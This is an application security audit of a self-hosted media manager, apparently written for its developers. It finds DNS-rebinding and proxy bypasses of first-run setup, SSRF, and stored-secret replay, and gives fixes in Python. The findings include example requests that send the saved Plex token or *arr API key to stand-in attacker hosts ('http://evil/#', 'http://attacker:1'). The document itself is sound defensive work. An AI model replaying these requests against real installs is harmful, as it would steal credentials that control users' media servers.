# AppSec audit & threat model — 2026-10-10

Scope: `src/` at `9cf2d18`, covering API endpoints, authentication and sessions, the
deletion path, outbound HTTP clients, secret storage, and injection sinks. The
frontend was checked only where it bears on token theft.

## 1. Threat model & security posture summary

Curatarr binds `0.0.0.0` and trusts the home LAN. Its trust boundaries are
**loopback** (exempt from the first-run setup code), **LAN** (Plex-OAuth members with
Bearer JWTs, and an admin who can trigger irreversible `deleteFiles=true` calls into
Radarr/Sonarr/Lidarr/Plex), and **outbound** (operator-supplied Plex/*arr/Ollama
URLs that carry high-value tokens). Steady-state auth is solid. Tokens are Bearer
headers rather than cookies, so cross-site requests can't act as the user, and
every destructive route is admin-gated and checks ownership. Most of the remaining
risk is in the **first-run window** (no admin yet) and the **"test connection"
endpoints**:

- The loopback exemption trusts only the TCP peer address. A DNS-rebound web page
  or a same-host reverse proxy also arrives from 127.0.0.1.
- The test endpoints accept arbitrary URLs. They replay the *stored* secret to
  whatever URL they are given and reflect the upstream response.

At worst, the owner's Plex token and *arr API keys can be stolen, which means full
control of the media stack, including file deletion through the *arr APIs. Data
destruction itself still requires an admin click.

## 2. Security vulnerability table

| File / Endpoint | Vulnerability Type | Severity | Attack Scenario & Impact | Recommended Remediation |
| :--- | :--- | :--- | :--- | :--- |
| `routers/auth.py › _require_setup_code` (no Host validation anywhere in `main.py`/middleware) | Auth bypass (DNS rebinding) | **High** (first-run window) | The exemption is `request.client.host in {"127.0.0.1","::1"}`. While no admin exists, the owner opens a web page on the Curatarr machine, and the page rebinds its name to 127.0.0.1. Its requests then arrive from loopback with `Host: evil.tld:8000`, so they skip the setup code, and the page can read the responses because they are now same-origin. Two outcomes: **(a)** `POST /api/setup/complete` with the attacker's own Plex URL and token, so the attacker's plex.tv account "owns the server" and becomes admin through the PIN flow in that same tab; **(b)** after the owner has run setup but before their first login, `POST /api/setup/test {"service":"plex","url":"http://evil/#"}` with a blank token, which returns the owner's stored **Plex token** to the attacker (see the next rows). Chrome's Local Network Access checks can block the rebind; Firefox and Safari don't. | Allow the exemption only when the Host header is a loopback name, no proxy headers are present, and Origin is loopback or absent (**Fix A**). Optionally add a TrustedHost middleware driven by an `ALLOWED_HOSTS` setting. |
| same | Auth bypass (reverse proxy) | **Medium** | SECURITY.md tells anyone exposing the app to put a reverse proxy in front. A proxy on the same host connects from 127.0.0.1. uvicorn rewrites `request.client` only when `X-Forwarded-For` is present (`forwarded_allow_ips` defaults to 127.0.0.1). If nginx is set up without `proxy_set_header X-Forwarded-For`, every internet client looks local, and on a fresh install anyone can complete setup without the code. | **Fix A** removes proxied requests from the exemption. Document that setup must be finished before the app is exposed. |
| `routers/setup.py › test_connection` (`POST /api/setup/test`), `routers/library.py › library_test` (`POST /api/library/test`, also reached via `/configure`) | Secret exfiltration (stored-credential replay) | **Medium** | "Blank secret = use the saved one" also applies when the URL is new: `{"service":"radarr","url":"http://attacker:1"}` sends the saved Radarr `X-Api-Key` to the attacker, and `service:"plex"` sends the owner's Plex token. This defeats the write-only secret design (`mask_secrets` never sends secrets to the browser). Reachable by any admin session, including a JWT stolen from `localStorage` by an XSS, and by anyone who passes the first-run gate (row 1). | Fall back to the stored secret only when the URL is blank or has the **same origin** as the stored URL (**Fix B**). |
| `setup.py` `/test`, `/recommend`, `/warmup`, `/complete`, `/reconfigure`; `library.py` `/test`, `/configure` | SSRF | **Medium** (admin or first-run only) | URLs are accepted as free strings. `endpoint_privacy_note` only warns. The fixed path suffix (`/identity`, `/api/v3/system/status`, `/api/tags`) is dropped with a `#` or swallowed by a `?` (verified: `httpx.URL("http://10.0.0.1/secret#/identity").raw_path == b"/secret"`). `arr_client.request` raises `API error {status}: {body}`, and `library_test` returns `str(exc)`, so **the full body of any internal 4xx/5xx endpoint is reflected** to the caller and also stored in `app_state lib_test:*:last`. Connection-error strings tell refused from timed out, so the endpoint works as a LAN port scanner. Link-local and cloud-metadata addresses (169.254.169.254) are not refused. `/complete` also fires background POSTs (`/api/pull`, `/api/create`) at an arbitrary `ollama_endpoint`. | Validate service URLs where the request model is parsed (**Fix C**): http(s) only, no userinfo, query or fragment, and refuse link-local, metadata, unspecified and multicast addresses. RFC1918 addresses stay allowed because that is the product. Return error *classes*, not upstream bodies. |
| `routers/recommendations.py › _execute_arr_delete`, `_plex_delete_artist` | Destructive action: missing parameter validation | **Low** | `url = f"{base}/{path}/{p.media_id}"` is built with no check on the id. Proposals are created with `media_id=str(p.get("arr_id", ""))`, so a missing id becomes `""` and the request becomes `DELETE /api/v3/movie/?deleteFiles=true`. httpx also normalises dot segments (`movie/../../v3/config/host` → `/api/v3/config/host`). Ids come from arr/Plex responses today, so an attacker can't reach this, but it is the one irreversible call and it has no shape check. | Require `^[1-9]\d*$` right before building the DELETE URL. On failure, return `False` so the proposal is marked "error" (**Fix D**). Apply the same check to the Plex rating key. |
| `routers/users.py › set_pin` / `UserPinHash` | Crypto design / misleading control | **Low** (Medium if PIN-based encryption comes back) | This is leftover code. SECURITY.md says PIN encryption was dropped, but the endpoint and the Settings UI still take a PIN, and the docstring still says AES keys are derived from it. PBKDF2-SHA256 with 100k iterations and a 32-byte salt is fine for a password. A PIN of 6 or more characters, likely all digits, has about 10⁶ possibilities, and the hash and salt sit in the same SQLite file, so the PIN can be **recovered offline in seconds**. `current_pin` checks have no rate limit. PBKDF2 runs on the event loop and blocks every other request for about 50–100 ms per call. | Remove the endpoint, the UI and the table, **or** use scrypt/Argon2id off the event loop with a per-user attempt budget (**Fix E**). For any future at-rest encryption, never store a PIN verifier next to the ciphertext. Wrap a random data key with the OS keystore instead (DPAPI, Keychain, libsecret). |
| `routers/library.py › library_profiles` (`GET /api/library/profiles/{service}`) | Authorization / info disclosure | **Low** | Gated by `get_current_user`, not admin. Any household member gets the arr root-folder paths and raw exception text (aiohttp `Cannot connect to host 192.168.x.x:7878`). SECURITY.md says members don't see these. | Use `require_admin`, or remove `root_folders` and the `*_error` fields for non-admins. |
| `routers/image_proxy.py › proxy_image` | Content injection (same-origin SVG) | **Low** | Any upstream `image/*` is accepted, including `image/svg+xml`. The first response is served from the Curatarr origin with the upstream content type. The whitelist includes coverartarchive.org, which hosts user-uploaded art. CSP `script-src 'self'` blocks script inside the SVG, so the impact is limited to markup such as a phishing page. | Accept only the raster types in `_CT_FOR_EXT`. Add `Content-Security-Policy: sandbox` to proxy responses. |
| `routers/imports.py › spotify_upload` | Resource exhaustion | **Low** | `await up.read()` loads each upload fully into memory before the 200 MB check, and there is no limit on files per request. Reachable by admins and first-run callers. | Read with a bound (`await up.read(cap + 1)`) and cap the file count. |
| `routers/auth.py › _decode_jwt`, `request_plex_pin` | Info disclosure | Info | The PyJWT exception text and the plex.tv response body are returned verbatim. | Return generic messages and log the detail on the server. |

### Checked and not vulnerable

- **SQL injection:** none found. Queries use the SQLAlchemy ORM or parameterised `?`
  queries. The f-string SQL (`connection.py:217/219/349`, `lyrics.py:124`) only
  interpolates constant or `sqlite_master`-sourced identifiers inside migrations.
- **Command injection:** none found. Every `subprocess` call uses a fixed argv with
  no shell (`nvidia-smi`, `icacls`, `uv`, `pip`). The tray's PowerShell shortcut
  string doubles single quotes, which is the correct escape inside `'…'`.
- **CSRF:** sessions are Bearer headers (`localStorage`), never cookies, so a
  cross-site request can't authenticate. CORS uses explicit origins, and a `*` entry
  turns credentials off. `/api/system/shutdown`, the deletion routes and
  `/reconfigure` are admin-gated and Bearer-only.
- **File-deletion path traversal and symlinks:** Curatarr never deletes local media.
  Deletion is done by id through the *arr and Plex APIs, so there is no filesystem
  path to traverse. The SPA catch-all uses `resolve()` plus `relative_to()`.
- **JWT:** HS256 is pinned on decode. The secret is 256-bit. Logout and deactivation
  bump `token_version`, and refreshed tokens are re-issued from the database row.
- **Setup code:** 32 bits from `secrets`, compared with `compare_digest`. Wrong
  codes are budgeted per IP and globally, and the lockout is checked *before* the
  comparison. Brute force at 100 guesses per 15 minutes is not practical.
- **Secrets at rest:** `.env` is created 0600 (or with an owner-only ACL on Windows)
  and replaced atomically. Newlines are rejected, so values can't inject extra keys.
  Secrets are masked in `/integrations`. The `httpx`/`httpcore` loggers are pinned to
  WARNING, so query-string API keys (TMDB, OMDb, Last.fm) don't reach the log.
- **Image proxy SSRF:** host whitelist, every redirect hop re-checked, and the
  resolved address must be public, which defeats rebinding.
- **SSE:** one-time `uuid4` tickets with a 60 s TTL. No JWT in URLs.

## 3. Concrete security fixes & hardening code

The checks in the fixes below were run under the pinned httpx (0.28.x).

### Fix A — loopback exemption that can't be rebound or proxied (`src/routers/auth.py`)

```python
from urllib.parse import urlsplit

_LOOPBACK_PEERS = {"127.0.0.1", "::1"}
_LOOPBACK_NAMES = {"localhost", "127.0.0.1", "::1"}
# Any of these means a hop sits in front of us: the peer is the proxy, not the browser.
_PROXY_HEADERS = ("x-forwarded-for", "x-forwarded-host", "x-real-ip", "forwarded")


def _hostname(value: str) -> str:
    try:
        return (urlsplit("//" + value).hostname or "").lower()   # handles [::1]:8000
    except ValueError:
        return ""


def _is_genuine_local_browser(request: Request) -> bool:
    """Loopback peer is necessary, not sufficient: a DNS-rebound page and a
    same-host reverse proxy both connect from 127.0.0.1. The browser on this
    machine addresses us as localhost, without proxy headers, and any Origin
    it sends is loopback too."""
    peer = (request.client.host if request.client else "") or ""
    if peer not in _LOOPBACK_PEERS:
        return False
    if _hostname(request.headers.get("host", "")) not in _LOOPBACK_NAMES:
        return False
    if any(h in request.headers for h in _PROXY_HEADERS):
        return False
    origin = request.headers.get("origin")
    if origin and (urlsplit(origin).hostname or "").lower() not in _LOOPBACK_NAMES:
        return False
    return True


def _require_setup_code(request: Request) -> None:
    from src.services import rate_limit
    if _is_genuine_local_browser(request):
        return
    client = (request.client.host if request.client else "") or ""
    ...  # unchanged from here
```

uvicorn's `ProxyHeadersMiddleware` rewrites `request.client` from
`X-Forwarded-For` but leaves the header in place, so the proxy-header check still
applies after the rewrite.

### Fix B — stored secrets go only to the stored origin (`setup.py` / `library.py`)

```python
import httpx
from fastapi import HTTPException

_DEFAULT_PORTS = {"http": 80, "https": 443}


def _origin(url: str) -> tuple:
    u = httpx.URL(url)
    return (u.scheme, (u.host or "").lower(), u.port or _DEFAULT_PORTS.get(u.scheme))


def secret_for_target(supplied_url, supplied_secret, stored_url, stored_secret) -> str:
    """A typed secret goes wherever the admin points it. A SAVED secret is only
    ever sent to the address it was saved for: otherwise 'Test connection' with
    a blank key field would send it to any URL typed into the URL field."""
    if supplied_secret:
        return supplied_secret
    if not supplied_url:
        return stored_secret or ""
    try:
        same = bool(stored_url) and _origin(supplied_url) == _origin(stored_url)
    except Exception:
        same = False
    if not same:
        raise HTTPException(400, "Enter the key for this new address - the saved "
                                 "key is only sent to the saved address")
    return stored_secret


# setup.py › test_connection
if req.service == "plex":
    result = await test_plex(
        req.url or settings.effective_plex_url,
        secret_for_target(req.url, req.token, settings.effective_plex_url,
                          settings.effective_plex_token))
elif req.service in ("radarr", "sonarr", "lidarr"):
    up = req.service.upper()
    result = await test_arr(
        req.url or _stored(f"{up}_URL"),
        secret_for_target(req.url, req.api_key, _stored(f"{up}_URL"),
                          _stored(f"{up}_API_KEY")),
        req.service)

# library.py › library_test
effective_url = req.url or saved_url or ""
effective_key = secret_for_target(req.url, req.api_key, saved_url, saved_key)
```

### Fix C — service-URL policy and no reflected upstream bodies

```python
# src/services/url_policy.py
import ipaddress
import httpx

# RFC1918 / loopback / .local stay legal - Plex and the arrs live there.
# These never host a media service and are the classic SSRF targets.
_REFUSED_NETS = [ipaddress.ip_network(n) for n in (
    "169.254.0.0/16", "fe80::/10",          # link-local (AWS/GCP/Azure metadata)
    "fd00:ec2::254/128", "100.100.100.200/32",  # AWS IPv6 / Alibaba metadata
)]


def validate_service_url(raw: str) -> str:
    """Normalised base URL, or ValueError. Blank stays blank (= 'unset')."""
    raw = (raw or "").strip()
    if not raw:
        return ""
    try:
        u = httpx.URL(raw)
    except Exception:
        raise ValueError("not a valid URL")
    if u.scheme not in ("http", "https"):
        raise ValueError("only http:// and https:// are supported")
    if not u.host:
        raise ValueError("URL has no host")
    if u.userinfo:
        raise ValueError("put credentials in the key field, not the URL")
    # A '#' or '?' would cut off or swallow the fixed API path we append.
    if u.query or u.fragment or "#" in raw or "?" in raw:
        raise ValueError("a base URL cannot carry a query string or fragment")
    try:
        ip = ipaddress.ip_address(u.host)
    except ValueError:
        ip = None
    if ip is not None and (ip.is_multicast or ip.is_unspecified or ip.is_reserved
                           or any(ip in n for n in _REFUSED_NETS)):
        raise ValueError(f"{u.host} is not an address a media service can live at")
    return str(u).rstrip("/")
```

```python
# Wire it into every request model that carries a service URL, e.g. setup.py:
from pydantic import field_validator
from src.services.url_policy import validate_service_url

class TestRequest(BaseModel):
    ...
    @field_validator("url")
    @classmethod
    def _url(cls, v):
        return validate_service_url(v) if v else v

# Same validator on SetupCompleteRequest / ReconfigureRequest
# (plex_url, ollama_endpoint, radarr_url, sonarr_url, lidarr_url, soulsync_url),
# RecommendRequest / WarmupRequest.ollama_endpoint and library.ArrTestRequest.url.
```

```python
# library.py › library_test: classify, don't reflect.
def _public_error(exc: Exception) -> str:
    text = str(exc)
    if text.startswith("API error 401") or text.startswith("API error 403"):
        return "Rejected the API key (HTTP 401/403)"
    if text.startswith("API error "):
        return f"Unexpected answer ({text[10:13]}) - is this the right service and URL?"
    return "Could not connect"            # no refused/timeout distinction = no port scan

# ...in both except branches:
logger.info("[library] %s test failed: %s", req.service, exc)   # detail stays server-side
return {"ok": False, "service": req.service, "error": _public_error(exc),
        "privacy_warning": privacy_warning}
```

A name that resolves to a link-local address gets past the literal-IP check in
Fix C. Closing that gap means resolving the name before connecting:
`image_proxy._host_resolves_public` already does this and can be generalised into
`url_policy` with a "private allowed, link-local refused" predicate.

### Fix D — fail-closed id check on the irreversible call (`routers/recommendations.py`)

```python
import re
_ARR_ID = re.compile(r"[1-9][0-9]{0,9}")


def _require_numeric_id(value) -> str:
    """Arr ids and Plex rating keys are positive integers. Anything else ('' from
    a missing arr_id, 'None', a path fragment) must never reach a DELETE URL:
    '' turns /movie/{id} into the collection path and httpx normalises '..'."""
    s = str(value if value is not None else "").strip()
    if not _ARR_ID.fullmatch(s):
        raise ValueError(f"refusing to delete: malformed media id {value!r}")
    return s


# _execute_arr_delete, before building the URL:
try:
    media_id = _require_numeric_id(p.media_id)
except ValueError as e:
    logger.error("[%s] %s (proposal %s)", p.service, e, p.id)
    return False                                  # -> status "error", nothing sent
url = f"{base}/{path}/{media_id}"

# _plex_delete_artist:
try:
    key = _require_numeric_id(key)
except ValueError as e:
    logger.error("[plex] %s", e)
    return False
```

### Fix E — if the PIN stays: memory-hard, off-loop, throttled (`routers/users.py`)

```python
import asyncio, hashlib, hmac, os

_SCRYPT = dict(n=2**15, r=8, p=1, maxmem=64 * 1024 * 1024, dklen=32)


def _hash_pin_v2(pin: str) -> tuple[str, str]:
    salt = os.urandom(16)
    dk = hashlib.scrypt(pin.encode(), salt=salt, **_SCRYPT)
    return f"scrypt$15$8$1${dk.hex()}", salt.hex()


def _verify_pin(pin: str, stored_hash: str, salt_hex: str) -> bool:
    if stored_hash.startswith("scrypt$"):
        _, n, r, p, dk = stored_hash.split("$")
        got = hashlib.scrypt(pin.encode(), salt=bytes.fromhex(salt_hex),
                             n=2 ** int(n), r=int(r), p=int(p),
                             maxmem=64 * 1024 * 1024, dklen=len(dk) // 2)
        return hmac.compare_digest(got.hex(), dk)
    # legacy PBKDF2 row - verify, then the caller re-hashes with v2
    legacy = hashlib.pbkdf2_hmac("sha256", pin.encode(), salt_hex.encode(), 100_000).hex()
    return hmac.compare_digest(legacy, stored_hash)


# in set_pin, before verifying current_pin:
from src.services import rate_limit
rate_limit.enforce("pin-verify", user.id, 5, 15 * 60,
                   detail="Too many wrong PINs - wait 15 minutes")
ok = await asyncio.to_thread(_verify_pin, body.current_pin, existing.pin_hash, existing.salt)
```

A stronger KDF only slows down an attack on a 10⁶-value PIN space. It does not
make one safe. If a PIN ever protects data again, the key must also depend on
something that isn't stored next to the ciphertext, such as an OS-keystore-wrapped
key or a server-side pepper kept outside the database.

## Priority order

1. **Fix A**: closes the only path to unauthenticated, remote-reachable compromise.
2. **Fix B**: a one-function change that keeps the masked secrets write-only.
3. **Fix C**: removes the SSRF read primitive and the port scanner.
4. **Fix D**: defence in depth on the one irreversible call.
5. Delete the leftover PIN feature, or apply **Fix E**.
6. The Low/Info items: profiles authz, SVG on the proxy, upload bounds, error text.
